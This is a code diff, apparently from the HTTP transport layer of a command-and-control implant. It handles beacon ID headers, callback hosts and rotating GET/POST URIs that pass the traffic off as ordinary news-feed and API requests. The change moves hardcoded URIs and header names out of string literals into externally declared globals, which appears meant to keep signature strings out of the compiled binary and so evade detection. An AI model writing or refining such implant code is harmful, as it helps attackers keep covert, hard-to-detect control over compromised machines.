@@ -4,12 +4,11 @@
  * HttpCodec.c (NaxEncodeData / NaxDecodeData / NaxBuildRequestHeaders).
  */
 
-#ifndef NAX_HTTP_URI_GET
-#  define NAX_HTTP_URI_GET  "/news/feed"
-#endif
-#ifndef NAX_HTTP_URI_POST
-#  define NAX_HTTP_URI_POST "/api/submit"
-#endif
+/* Pre-profile strings are in https.c volatile globals — declared extern here */
+extern char g_uri_get[64];
+extern char g_uri_post[64];
+extern char g_beacon_hdr[32];
+extern char g_public_hdr[32];
 
 #ifdef NAX_HTTPS_MODE
 
@@ -256,7 +255,7 @@ void nax_apply_profile(const uint8_t *data, uint32_t data_len)
 
 
 int         nax_profile_loaded(void)    { return g_profile.loaded; }
-const char *nax_profile_beacon_hdr(void){ return g_profile.loaded ? g_profile.beacon_id_hdr : "X-Beacon-Id"; }
+const char *nax_profile_beacon_hdr(void){ return g_profile.loaded ? g_profile.beacon_id_hdr : g_beacon_hdr; }
 
 void nax_dbg_print_profile_pub(void) {
 #ifdef NAX_DEBUG
@@ -310,8 +309,8 @@ static void nax_dbg_print_profile(const NaxHttpProfile *p, const char *event)
 #else
 #  define nax_dbg_print_profile(p, event) do {} while(0)
 #endif
-const char *nax_profile_get_uri(void)   { return (g_profile.loaded && g_profile.get_uri_count > 0) ? g_profile.get_uris[g_profile.get_uri_idx] : NAX_HTTP_URI_GET; }
-const char *nax_profile_post_uri(void)  { return (g_profile.loaded && g_profile.post_uri_count > 0) ? g_profile.post_uris[0] : NAX_HTTP_URI_POST; }
+const char *nax_profile_get_uri(void)   { return (g_profile.loaded && g_profile.get_uri_count > 0) ? g_profile.get_uris[g_profile.get_uri_idx] : g_uri_get; }
+const char *nax_profile_post_uri(void)  { return (g_profile.loaded && g_profile.post_uri_count > 0) ? g_profile.post_uris[0] : g_uri_post; }
 uint8_t     nax_profile_rotation(void)  { return g_profile.loaded ? g_profile.rotation : 0; }
 uint8_t     nax_profile_callbacks_count(void) { return g_profile.loaded ? g_profile.callback_count : 0; }
 
@@ -323,7 +322,7 @@ int nax_profile_callback_host(uint8_t idx, char *host, uint16_t *port) {
 }
 
 const char *nax_profile_get_uri_rotate(void) {
-    if (!g_profile.loaded || g_profile.get_uri_count == 0) return NAX_HTTP_URI_GET;
+    if (!g_profile.loaded || g_profile.get_uri_count == 0) return g_uri_get;
     uint8_t idx = g_profile.get_uri_idx;
     g_profile.get_uri_idx = (g_profile.rotation == 1)
         ? (uint8_t)(rand() % g_profile.get_uri_count)
@@ -332,7 +331,7 @@ const char *nax_profile_get_uri_rotate(void) {
 }
 
 const char *nax_profile_post_uri_rotate(void) {
-    if (!g_profile.loaded || g_profile.post_uri_count == 0) return NAX_HTTP_URI_POST;
+    if (!g_profile.loaded || g_profile.post_uri_count == 0) return g_uri_post;
     uint8_t idx = g_profile.post_uri_idx;
     g_profile.post_uri_idx = (g_profile.rotation == 1)
         ? (uint8_t)(rand() % g_profile.post_uri_count)
@@ -662,7 +661,7 @@ uint32_t nax_build_request_headers(const char *sid,
     }
 
     /* X-NaX-Public: 1 */
-    off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off, "X-NaX-Public: 1\r\n");
+    off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off, "%s: 1\r\n", g_public_hdr);
 
     return off;
 }
